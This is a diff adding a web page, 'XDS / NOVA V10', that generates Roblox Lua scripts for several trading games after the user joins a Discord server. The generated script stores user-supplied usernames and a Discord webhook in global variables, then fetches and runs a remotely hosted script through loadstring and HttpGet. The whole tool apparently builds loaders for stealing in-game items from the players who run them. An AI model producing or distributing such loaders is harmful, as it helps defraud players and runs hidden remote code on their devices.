@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XDS / NOVA V10</title>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+:root{
+    --bg:#020202;
+    --panel:rgba(255,255,255,.04);
+    --border:rgba(255,255,255,.09);
+    --text:#fff;
+    --muted:#666;
+    --accent:#fff;
+}
+
+body{
+    min-height:100vh;
+    color:var(--text);
+    background:
+        radial-gradient(circle at 50% -10%,rgba(255,255,255,.10),transparent 35%),
+        radial-gradient(circle at 0% 100%,rgba(255,255,255,.035),transparent 30%),
+        var(--bg);
+    font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    overflow-x:hidden;
+}
+
+body:before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.14;
+    background-image:
+        linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+    background-size:45px 45px;
+}
+
+nav{
+    height:74px;
+    padding:0 7%;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    border-bottom:1px solid var(--border);
+    background:rgba(0,0,0,.4);
+    backdrop-filter:blur(24px);
+    position:sticky;
+    top:0;
+    z-index:50;
+}
+
+.logo{
+    font-size:15px;
+    font-weight:900;
+    letter-spacing:2px;
+}
+
+.logo span{color:#666}
+
+.discord{
+    color:#999;
+    text-decoration:none;
+    font-size:10px;
+    letter-spacing:1.3px;
+    border:1px solid rgba(255,255,255,.1);
+    padding:9px 14px;
+    border-radius:8px;
+    transition:.25s;
+}
+
+.discord:hover{
+    color:#fff;
+    border-color:rgba(255,255,255,.3);
+    box-shadow:0 0 24px rgba(255,255,255,.07);
+}
+
+main{
+    width:min(820px,94%);
+    margin:auto;
+    padding:60px 0 110px;
+}
+
+.hero{text-align:center;margin-bottom:42px}
+
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    padding:7px 14px;
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:100px;
+    color:#777;
+    font-size:9px;
+    letter-spacing:2px;
+    margin-bottom:18px;
+    background:rgba(255,255,255,.02);
+}
+
+h1{
+    font-size:clamp(42px,8vw,74px);
+    letter-spacing:-4px;
+    line-height:.94;
+    font-weight:900;
+}
+
+h1 span{
+    color:transparent;
+    -webkit-text-stroke:1px rgba(255,255,255,.45);
+}
+
+.hero p{
+    color:#555;
+    font-size:12px;
+    margin-top:16px;
+    letter-spacing:.3px;
+}
+
+.panel{
+    padding:28px;
+    border:1px solid var(--border);
+    border-radius:22px;
+    background:linear-gradient(145deg,rgba(255,255,255,.055),rgba(255,255,255,.012));
+    box-shadow:0 30px 90px rgba(0,0,0,.65),inset 0 1px rgba(255,255,255,.04);
+    backdrop-filter:blur(28px);
+    animation:fadeUp .5s ease both;
+}
+
+@keyframes fadeUp{
+    from{opacity:0;transform:translateY(18px)}
+    to{opacity:1;transform:translateY(0)}
+}
+
+.section{margin-bottom:22px}
+
+.label-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:9px;
+}
+
+.label{
+    font-size:10px;
+    font-weight:800;
+    color:#aaa;
+    text-transform:uppercase;
+    letter-spacing:1.7px;
+}
+
+.optional{
+    color:#444;
+    font-size:8px;
+    letter-spacing:1px;
+    text-transform:uppercase;
+}
+
+input,select,textarea{
+    width:100%;
+    border-radius:12px;
+    border:1px solid var(--border);
+    outline:none;
+    background:rgba(0,0,0,.55);
+    color:#fff;
+    padding:0 15px;
+    font-size:12.5px;
+    transition:.25s;
+    font-family:inherit;
+}
+
+input,select{height:52px}
+
+textarea{
+    padding:13px 15px;
+    resize:vertical;
+    min-height:100px;
+    line-height:1.55;
+}
+
+input::placeholder,textarea::placeholder{color:#444}
+
+input:focus,select:focus,textarea:focus{
+    border-color:rgba(255,255,255,.35);
+    box-shadow:0 0 0 3px rgba(255,255,255,.03),0 0 32px rgba(255,255,255,.06);
+}
+
+select{
+    appearance:none;
+    cursor:pointer;
+}
+
+.select-wrap{position:relative}
+
+.select-wrap:after{
+    content:"⌄";
+    position:absolute;
+    right:16px;
+    top:14px;
+    color:#666;
+    pointer-events:none;
+    font-size:17px;
+}
+
+select option{background:#090909;color:#fff}
+
+.tags{
+    display:flex;
+    flex-wrap:wrap;
+    gap:8px;
+    margin-top:11px;
+}
+
+.tag{
+    display:flex;
+    gap:8px;
+    align-items:center;
+    padding:7px 11px;
+    background:rgba(255,255,255,.04);
+    border:1px solid rgba(255,255,255,.09);
+    border-radius:8px;
+    font-size:11px;
+    animation:pop .2s ease;
+}
+
+@keyframes pop{
+    from{opacity:0;transform:scale(.85)}
+    to{opacity:1;transform:scale(1)}
+}
+
+.remove{
+    border:0;
+    background:none;
+    color:#555;
+    cursor:pointer;
+    font-size:14px;
+    line-height:1;
+}
+
+.remove:hover{color:#fff}
+
+.tag-actions{
+    display:flex;
+    gap:8px;
+    margin-top:10px;
+}
+
+.mini-btn{
+    font-size:9px;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    color:#666;
+    background:transparent;
+    border:1px solid rgba(255,255,255,.08);
+    padding:6px 10px;
+    border-radius:6px;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.mini-btn:hover{
+    color:#fff;
+    border-color:rgba(255,255,255,.2);
+}
+
+.webhook-status{
+    font-size:9px;
+    margin-top:7px;
+    letter-spacing:.5px;
+    height:14px;
+}
+
+.webhook-status.valid{color:#4ade80}
+.webhook-status.invalid{color:#f87171}
+
+.visual-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:14px 16px;
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:12px;
+    background:rgba(255,255,255,.02);
+}
+
+.visual-row strong{
+    display:block;
+    font-size:11px;
+    margin-bottom:3px;
+}
+
+.visual-row small{
+    color:#505050;
+    font-size:9px;
+}
+
+.switch{
+    width:42px;
+    height:23px;
+    padding:3px;
+    border-radius:20px;
+    border:1px solid #292929;
+    background:#121212;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.switch i{
+    display:block;
+    width:15px;
+    height:15px;
+    border-radius:50%;
+    background:#555;
+    transition:.2s;
+}
+
+.switch.active{background:#eee}
+.switch.active i{
+    background:#000;
+    transform:translateX(18px);
+}
+
+.char-count{
+    font-size:9px;
+    color:#444;
+    text-align:right;
+    margin-top:6px;
+}
+
+.generate{
+    width:100%;
+    height:54px;
+    border:0;
+    border-radius:12px;
+    background:#fff;
+    color:#000;
+    font-size:11px;
+    font-weight:900;
+    letter-spacing:1.5px;
+    cursor:pointer;
+    transition:.25s;
+    margin-top:6px;
+}
+
+.generate.locked{
+    background:#151515;
+    color:#555;
+    border:1px solid #222;
+}
+
+.generate:not(.locked):hover{
+    transform:translateY(-2px);
+    box-shadow:0 16px 40px rgba(255,255,255,.14);
+}
+
+.generate:not(.locked):active{transform:translateY(0)}
+
+.btn-row{
+    display:flex;
+    gap:10px;
+    margin-top:12px;
+}
+
+.secondary-btn{
+    flex:1;
+    height:44px;
+    border-radius:10px;
+    border:1px solid rgba(255,255,255,.1);
+    background:transparent;
+    color:#888;
+    font-size:10px;
+    font-weight:700;
+    letter-spacing:1.2px;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.secondary-btn:hover{
+    color:#fff;
+    border-color:rgba(255,255,255,.25);
+    background:rgba(255,255,255,.03);
+}
+
+.join-note{
+    text-align:center;
+    color:#555;
+    font-size:9px;
+    margin-top:12px;
+    line-height:1.6;
+}
+
+.join-note a{
+    color:#aaa;
+    text-decoration:none;
+}
+
+.join-note a:hover{color:#fff}
+
+.output{
+    display:none;
+    margin-top:20px;
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:14px;
+    overflow:hidden;
+    background:#050505;
+    animation:fadeUp .35s ease;
+}
+
+.output.show{display:block}
+
+.output-head{
+    height:44px;
+    padding:0 14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    border-bottom:1px solid rgba(255,255,255,.07);
+}
+
+.output-title{
+    color:#666;
+    font-size:9px;
+    letter-spacing:1.4px;
+    text-transform:uppercase;
+}
+
+.output-actions{display:flex;gap:8px}
+
+.copy,.dl{
+    padding:6px 11px;
+    background:transparent;
+    color:#888;
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:6px;
+    cursor:pointer;
+    font-size:8px;
+    letter-spacing:.8px;
+    transition:.2s;
+}
+
+.copy:hover,.dl:hover{color:#fff;border-color:rgba(255,255,255,.25)}
+
+pre{
+    padding:18px;
+    overflow:auto;
+    color:#aaa;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;
+    font-size:11px;
+    line-height:1.7;
+    max-height:420px;
+}
+
+footer{
+    text-align:center;
+    margin-top:30px;
+    color:#2a2a2a;
+    font-size:8px;
+    letter-spacing:1.6px;
+}
+
+.toast{
+    position:fixed;
+    bottom:28px;
+    left:50%;
+    transform:translate(-50%,24px);
+    opacity:0;
+    pointer-events:none;
+    padding:11px 18px;
+    background:#111;
+    border:1px solid #2a2a2a;
+    border-radius:10px;
+    color:#ccc;
+    font-size:11px;
+    letter-spacing:.3px;
+    transition:.28s cubic-bezier(.2,.8,.2,1);
+    z-index:100;
+    box-shadow:0 12px 40px rgba(0,0,0,.5);
+}
+
+.toast.show{
+    opacity:1;
+    transform:translate(-50%,0);
+}
+
+.hint{
+    font-size:9px;
+    color:#3a3a3a;
+    text-align:center;
+    margin-top:14px;
+    letter-spacing:.4px;
+}
+
+@media(max-width:600px){
+    nav{padding:0 5%}
+    main{padding-top:40px}
+    .panel{padding:20px}
+    h1{letter-spacing:-2.5px}
+    .btn-row{flex-direction:column}
+}
+</style>
+</head>
+
+<body>
+
+<nav>
+    <div class="logo">XDS <span>/ NOVA</span></div>
+    <a class="discord" href="https://discord.gg/k659sVwTpH" target="_blank" rel="noopener">DISCORD ↗</a>
+</nav>
+
+<main>
+<section class="hero">
+    <div class="badge">✦ V10 CONFIGURATOR · SMART</div>
+    <h1>XDS <span>/ NOVA</span></h1>
+    <p>Premium configuration generator</p>
+</section>
+
+<div class="panel">
+
+    <!-- GAME -->
+    <div class="section">
+        <div class="label-row">
+            <div class="label">Loader Scripts</div>
+            <div class="optional">Select Game</div>
+        </div>
+        <div class="select-wrap">
+            <select id="gameSelect">
+                <option value="Adopt Me">Adopt Me</option>
+                <option value="Murder Mystery 2">Murder Mystery 2</option>
+                <option value="Blox Fruits">Blox Fruits</option>
+                <option value="Grow a Garden 2">Grow a Garden 2</option>
+            </select>
+        </div>
+    </div>
+
+    <!-- USERNAMES -->
+    <div class="section">
+        <div class="label-row">
+            <div class="label">Username</div>
+            <div class="optional">Press Enter</div>
+        </div>
+        <input id="username" placeholder="Enter username..." autocomplete="off">
+        <div class="tags" id="tags"></div>
+        <div class="tag-actions">
+            <button class="mini-btn" id="clearUsers" type="button">Clear All</button>
+        </div>
+    </div>
+
+    <!-- WEBHOOK -->
+    <div class="section">
+        <div class="label-row">
+            <div class="label">Webhook</div>
+            <div class="optional">Optional</div>
+        </div>
+        <input id="webhook" type="url" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+        <div class="webhook-status" id="webhookStatus"></div>
+    </div>
+
+    <!-- VISUAL -->
+    <div class="section">
+        <div class="label-row">
+            <div class="label">Visual</div>
+            <div class="optional">Optional</div>
+        </div>
+        <textarea id="visualInput" placeholder="Paste your visual configuration here..." rows="4"></textarea>
+        <div class="char-count" id="charCount">0 characters</div>
+    </div>
+
+    <!-- VISUAL TOGGLE -->
+    <div class="section">
+        <div class="visual-row">
+            <div>
+                <strong>Visual Mode</strong>
+                <small>Include visual configuration</small>
+            </div>
+            <button class="switch active" id="visualSwitch" type="button"><i></i></button>
+        </div>
+    </div>
+
+    <!-- GENERATE -->
+    <button class="generate locked" id="generate" type="button">JOIN DISCORD TO GENERATE</button>
+
+    <div class="btn-row" id="extraBtns" style="display:none">
+        <button class="secondary-btn" id="downloadBtn" type="button">DOWNLOAD .LUA</button>
+        <button class="secondary-btn" id="copyMain" type="button">COPY CONFIG</button>
+    </div>
+
+    <div class="join-note">
+        You must join the Discord before generating.<br>
+        <a href="https://discord.gg/k659sVwTpH" target="_blank" rel="noopener" id="joinLink">Join discord.gg/k659sVwTpH</a>
+    </div>
+
+    <div class="hint">Tip: Press Ctrl + Enter to generate quickly</div>
+
+    <!-- OUTPUT -->
+    <div class="output" id="output">
+        <div class="output-head">
+            <div class="output-title">Generated Configuration</div>
+            <div class="output-actions">
+                <button class="dl" id="dl" type="button">DOWNLOAD</button>
+                <button class="copy" id="copy" type="button">COPY</button>
+            </div>
+        </div>
+        <pre id="code"></pre>
+    </div>
+
+</div>
+
+<footer>XDS / NOVA V10 · SMART CONFIGURATOR</footer>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const usernameInput = document.getElementById("username");
+const webhookInput  = document.getElementById("webhook");
+const visualInput   = document.getElementById("visualInput");
+const gameSelect    = document.getElementById("gameSelect");
+const tags          = document.getElementById("tags");
+const generate      = document.getElementById("generate");
+const output        = document.getElementById("output");
+const code          = document.getElementById("code");
+const copy          = document.getElementById("copy");
+const dl            = document.getElementById("dl");
+const visualSwitch  = document.getElementById("visualSwitch");
+const joinLink      = document.getElementById("joinLink");
+const toast         = document.getElementById("toast");
+const clearUsers    = document.getElementById("clearUsers");
+const webhookStatus = document.getElementById("webhookStatus");
+const charCount     = document.getElementById("charCount");
+const extraBtns     = document.getElementById("extraBtns");
+const downloadBtn   = document.getElementById("downloadBtn");
+const copyMain      = document.getElementById("copyMain");
+
+let usernames = [];
+let visualEnabled = true;
+let joined = false;
+
+/* ---------- LOAD SAVED DATA ---------- */
+function loadState(){
+    try{
+        const saved = JSON.parse(localStorage.getItem("xds_nova_v10") || "{}");
+        if(saved.usernames) usernames = saved.usernames;
+        if(saved.webhook) webhookInput.value = saved.webhook;
+        if(saved.visual) visualInput.value = saved.visual;
+        if(saved.game) gameSelect.value = saved.game;
+        if(typeof saved.visualEnabled === "boolean"){
+            visualEnabled = saved.visualEnabled;
+            visualSwitch.classList.toggle("active", visualEnabled);
+        }
+        if(saved.joined){
+            joined = true;
+            unlockGenerate();
+        }
+        renderTags();
+        updateCharCount();
+        validateWebhook();
+    }catch(e){}
+}
+
+function saveState(){
+    localStorage.setItem("xds_nova_v10", JSON.stringify({
+        usernames,
+        webhook: webhookInput.value.trim(),
+        visual: visualInput.value,
+        game: gameSelect.value,
+        visualEnabled,
+        joined
+    }));
+}
+
+/* ---------- USERNAMES ---------- */
+usernameInput.addEventListener("keydown", e => {
+    if(e.key !== "Enter") return;
+    e.preventDefault();
+    const value = usernameInput.value.trim();
+    if(!value) return;
+    if(usernames.includes(value)){
+        showToast("Username already added");
+        usernameInput.value = "";
+        return;
+    }
+    usernames.push(value);
+    usernameInput.value = "";
+    renderTags();
+    saveState();
+    livePreview();
+});
+
+function renderTags(){
+    tags.innerHTML = "";
+    usernames.forEach((name, index) => {
+        const tag = document.createElement("div");
+        tag.className = "tag";
+        tag.innerHTML = `<span>${escapeHtml(name)}</span><button class="remove" type="button">×</button>`;
+        tag.querySelector(".remove").onclick = () => {
+            usernames.splice(index, 1);
+            renderTags();
+            saveState();
+            livePreview();
+        };
+        tags.appendChild(tag);
+    });
+}
+
+clearUsers.addEventListener("click", () => {
+    usernames = [];
+    renderTags();
+    saveState();
+    livePreview();
+    showToast("Usernames cleared");
+});
+
+/* ---------- WEBHOOK VALIDATION ---------- */
+function validateWebhook(){
+    const v = webhookInput.value.trim();
+    if(!v){
+        webhookStatus.textContent = "";
+        webhookStatus.className = "webhook-status";
+        return;
+    }
+    const valid = /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/i.test(v);
+    webhookStatus.textContent = valid ? "✓ Valid Discord webhook" : "⚠ Doesn’t look like a Discord webhook";
+    webhookStatus.className = "webhook-status " + (valid ? "valid" : "invalid");
+}
+
+webhookInput.addEventListener("input", () => {
+    validateWebhook();
+    saveState();
+    livePreview();
+});
+
+/* ---------- VISUAL ---------- */
+visualInput.addEventListener("input", () => {
+    updateCharCount();
+    saveState();
+    livePreview();
+});
+
+function updateCharCount(){
+    const len = visualInput.value.length;
+    charCount.textContent = len + " character" + (len === 1 ? "" : "s");
+}
+
+visualSwitch.addEventListener("click", () => {
+    visualEnabled = !visualEnabled;
+    visualSwitch.classList.toggle("active", visualEnabled);
+    saveState();
+    livePreview();
+});
+
+/* ---------- DISCORD GATE ---------- */
+function unlockGenerate(){
+    generate.classList.remove("locked");
+    generate.textContent = "GENERATE CONFIGURATION";
+    extraBtns.style.display = "flex";
+}
+
+joinLink.addEventListener("click", () => {
+    joined = true;
+    unlockGenerate();
+    saveState();
+    showToast("Discord gate unlocked");
+});
+
+/* ---------- GENERATE LOGIC (keeps your exact format) ---------- */
+function buildConfig(){
+    const game = gameSelect.value;
+    const usernameText = usernames.map(x => `    "${x}"`).join(",\n");
+    const webhook = webhookInput.value.trim();
+    const visual = visualInput.value.trim();
+
+    let visualBlock = "";
+    if(visual && visualEnabled){
+        visualBlock = "\ntask.spawn(function()\n" + visual + "\nend)\n";
+    }
+
+    return `-- XDS / NOVA V10
+-- Game: ${game}
+
+local script_key = "trials"
+
+-- ====================== YOUR SETTINGS (EDIT THESE) ======================
+getgenv().MY_WEBHOOK = "${escapeLua(webhook)}"
+getgenv().MY_USERNAMES = {
+${usernameText}
+}
+-- ========================================================================
+${visualBlock}
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/33af84cb55bda083c9ec92d9f3c5f9dcbc12a6c1e4a0c7a79004c7d1241af896.lua"))()
+`;
+}
+
+function livePreview(){
+    if(!joined || usernames.length === 0) return;
+    code.textContent = buildConfig();
+    output.classList.add("show");
+}
+
+generate.addEventListener("click", () => {
+    if(!joined){
+        showToast("Join the Discord first");
+        return;
+    }
+    if(usernames.length === 0){
+        showToast("Add at least one username");
+        usernameInput.focus();
+        return;
+    }
+
+    code.textContent = buildConfig();
+    output.classList.add("show");
+    output.scrollIntoView({behavior:"smooth", block:"nearest"});
+    showToast("Configuration generated");
+});
+
+/* ---------- COPY / DOWNLOAD ---------- */
+async function copyConfig(){
+    try{
+        await navigator.clipboard.writeText(code.textContent);
+        showToast("Copied to clipboard");
+        copy.textContent = "COPIED";
+        setTimeout(() => copy.textContent = "COPY", 1400);
+    }catch{
+        showToast("Copy failed");
+    }
+}
+
+function downloadConfig(){
+    const blob = new Blob([code.textContent], {type: "text/plain"});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "XDS_NOVA_V10.lua";
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast("Downloaded .lua file");
+}
+
+copy.addEventListener("click", copyConfig);
+copyMain.addEventListener("click", () => {
+    if(!code.textContent){
+        showToast("Generate first");
+        return;
+    }
+    copyConfig();
+});
+dl.addEventListener("click", downloadConfig);
+downloadBtn.addEventListener("click", () => {
+    if(!code.textContent){
+        showToast("Generate first");
+        return;
+    }
+    downloadConfig();
+});
+
+/* ---------- KEYBOARD SHORTCUT ---------- */
+document.addEventListener("keydown", e => {
+    if((e.ctrlKey || e.metaKey) && e.key === "Enter"){
+        e.preventDefault();
+        generate.click();
+    }
+});
+
+/* ---------- HELPERS ---------- */
+function escapeLua(value){
+    return String(value)
+        .replace(/\\/g,"\\\\")
+        .replace(/"/g,'\\"')
+        .replace(/\n/g,"\\n")
+        .replace(/\r/g,"");
+}
+
+function escapeHtml(str){
+    return str.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+function showToast(message){
+    toast.textContent = message;
+    toast.classList.add("show");
+    clearTimeout(window.toastTimer);
+    window.toastTimer = setTimeout(() => toast.classList.remove("show"), 1900);
+}
+
+gameSelect.addEventListener("change", () => {
+    saveState();
+    livePreview();
+});
+
+/* ---------- INIT ---------- */
+loadState();
+</script>
+
+</body>
+</html>
